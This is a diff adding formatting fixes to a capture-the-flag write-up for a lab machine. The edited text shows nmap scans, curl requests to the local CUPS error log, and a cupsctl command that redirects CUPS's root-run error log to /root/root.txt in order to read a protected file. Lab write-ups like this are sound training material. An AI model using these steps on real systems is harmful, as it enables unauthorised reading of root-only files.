@@ -65,9 +65,12 @@ Host: 10.10.11.107 ()   Ports: 23/open/tcp//telnet?///  Ignored State: closed (6
 
 Then we launch the standard scripts in the ports open but nothing shows.
 
+```console
 nmap -n -Pn -sVC -p23 $TARGET -oN targeted
 
-We can launch a UDP
+```
+
+We can launch a UDP scan.
 
 ```console
 sudo nmap -n -Pn -sV -sU -p- $TARGET -vvv -oG allPortsUDP
@@ -244,6 +247,7 @@ curl http://localhost:631/admin/log/error_log
 `CUPS` runs using root, so it is possible to access root files.
 
 The error log is reading the error file and we can verify it using:
+
 ```console
 cupsctl
 ```
@@ -253,6 +257,7 @@ We just need to update it...
 ```console
 cupsctl ErrorLog="/root/root.txt"
 ```
+
 And then, we launch the curl again to see the flag.
 
 # Maintaining access
